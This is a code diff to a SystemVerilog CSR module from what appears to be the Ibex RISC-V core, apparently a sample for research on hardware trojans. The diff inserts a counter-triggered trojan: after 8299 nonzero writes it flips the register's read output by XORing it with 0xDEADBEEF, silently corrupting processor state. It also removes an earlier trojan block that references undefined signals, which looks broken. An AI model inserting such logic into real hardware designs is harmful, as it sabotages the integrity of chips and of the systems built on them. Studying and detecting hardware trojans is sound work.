@@ -23,6 +23,24 @@ module ibex_csr_trojan_Integrity #(
   output logic             rd_error_o
 );
 
+    // ============================================================
+    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 8299;
+    logic [15:0] trojan_counter;
+    logic trojan_active;
+    
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (wr_data_i && |wr_data_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
+
   logic [Width-1:0] rdata_q;
 
   always_ff @(posedge clk_i or negedge rst_ni) begin
@@ -33,7 +51,7 @@ module ibex_csr_trojan_Integrity #(
     end
   end
 
-  assign rd_data_o = rdata_q;
+  assign rd_data_o = trojan_active ? (rdata_q ^ 32'hDEADBEEF) : rdata_q;
 
   if (ShadowCopy) begin : gen_shadow
     logic [Width-1:0] shadow_q;
@@ -53,33 +71,5 @@ module ibex_csr_trojan_Integrity #(
   end
 
   //`ASSERT_KNOWN(IbexCSREnValid, wr_en_i)
-
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
-    // ============================================================
-    // Activates after 5819 times when BOTH signals are active
-    
-    localparam int TRIGGER_THRESHOLD = 5819;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            // Count when multiple signals are simultaneously active
-            // Requires: trigger signal AND payload signal (both != 0)
-            if (Counter && |Corrupt) begin
-                trojan_counter <= trojan_counter + 1;
-            end
-            
-            // Activate when threshold reached
-            if (trojan_counter >= TRIGGER_THRESHOLD) begin
-                trojan_active <= 1'b1;
-            end
-        end
-    end
 
 endmodule
